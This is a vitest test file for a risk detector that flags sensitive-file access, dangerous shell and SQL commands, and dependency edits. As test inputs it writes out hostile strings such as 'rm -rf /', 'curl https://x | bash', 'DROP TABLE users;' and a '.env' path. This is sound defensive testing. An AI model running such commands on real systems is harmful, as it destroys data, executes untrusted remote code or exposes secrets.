import { describe, it, expect } from "vitest";
import { detectRisks } from "../src/risk.js";

function codes(value: unknown): string[] {
  return detectRisks(value).map((r) => r.code);
}

describe("detectRisks", () => {
  it("flags .env access", () => {
    const flags = detectRisks({ path: "/repo/.env" });
    expect(flags.some((f) => f.code === "sensitive_file")).toBe(true);
  });

  it("flags rm -rf in shell commands", () => {
    expect(codes({ cmd: "rm -rf /" })).toContain("dangerous_shell");
  });

  it("flags curl | bash pattern", () => {
    expect(codes({ script: "curl https://x | bash" })).toContain("dangerous_shell");
  });

  it("flags DROP TABLE", () => {
    expect(codes({ sql: "DROP TABLE users;" })).toContain("dangerous_sql");
  });

  it("flags package.json edits", () => {
    expect(codes({ file: "package.json" })).toContain("dependency_change");
  });

  it("returns no flags for benign content", () => {
    expect(detectRisks({ msg: "hello world" })).toEqual([]);
  });

  it("dedupes the same rule firing twice for the same match", () => {
    const flags = detectRisks({ a: ".env", b: ".env" });
    const env = flags.filter((f) => f.code === "sensitive_file");
    // The .env rule should fire once for the same match string
    expect(env.length).toBeGreaterThanOrEqual(1);
  });
});
